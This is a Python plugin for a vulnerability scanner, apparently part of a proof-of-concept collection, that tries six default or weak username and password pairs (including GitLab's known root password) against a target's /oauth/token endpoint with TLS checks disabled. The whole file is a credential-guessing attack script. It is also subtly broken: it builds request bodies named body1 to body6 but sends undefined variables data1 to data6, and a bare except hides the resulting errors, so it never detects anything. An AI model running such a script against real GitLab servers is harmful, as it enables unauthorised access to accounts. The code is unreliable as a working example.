#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Gitlab 弱口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'content-type': 'application/json',
      }
  target = '/oauth/token'
  body1 = '{"grant_type":"password","username":"root","password":"5iveL!fe"}'
  body2 = '{"grant_type":"password","username":"root","password":"123456789"}'
  body3 = '{"grant_type":"password","username":"admin","password":"5iveL!fe"}'
  body4 = '{"grant_type":"password","username":"admin","password":"123456789"}'
  body5 = '{"grant_type":"password","username":"admin@local.host","password":"5iveL!fe"}'
  body6 = '{"grant_type":"password","username":"admin@local.host","password":"123456789"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data1,timeout=5,verify=False)
    if res.status_code == 200 and '"access_token":' in res.text and '"token_type":' in res.text and '"refresh_token":' in res.text and 'application/json' in res.headers['content-type']:
      ret['huixian'] = '账号密码：root/5iveL!fe'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.post(url=url1,headers=headers,data=data2,timeout=5,verify=False)
    if res.status_code == 200 and '"access_token":' in res.text and '"token_type":' in res.text and '"refresh_token":' in res.text and 'application/json' in res.headers['content-type']:
      ret['huixian'] = '账号密码：root/123456789'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.post(url=url1,headers=headers,data=data3,timeout=5,verify=False)
    if res.status_code == 200 and '"access_token":' in res.text and '"token_type":' in res.text and '"refresh_token":' in res.text and 'application/json' in res.headers['content-type']:
      ret['huixian'] = '账号密码：admin/5iveL!fe'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    res=requests.post(url=url1,headers=headers,data=data4,timeout=5,verify=False)
    if res.status_code == 200 and '"access_token":' in res.text and '"token_type":' in res.text and '"refresh_token":' in res.text and 'application/json' in res.headers['content-type']:
      ret['huixian'] = '账号密码：admin/123456789'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.post(url=url1,headers=headers,data=data5,timeout=5,verify=False)
    if res.status_code == 200 and '"access_token":' in res.text and '"token_type":' in res.text and '"refresh_token":' in res.text and 'application/json' in res.headers['content-type']:
      ret['huixian'] = '账号密码：admin@local.host/5iveL!fe'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.post(url=url1,headers=headers,data=data6,timeout=5,verify=False)
    if res.status_code == 200 and '"access_token":' in res.text and '"token_type":' in res.text and '"refresh_token":' in res.text and 'application/json' in res.headers['content-type']:
      ret['huixian'] = '账号密码：admin@local.host/123456789'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret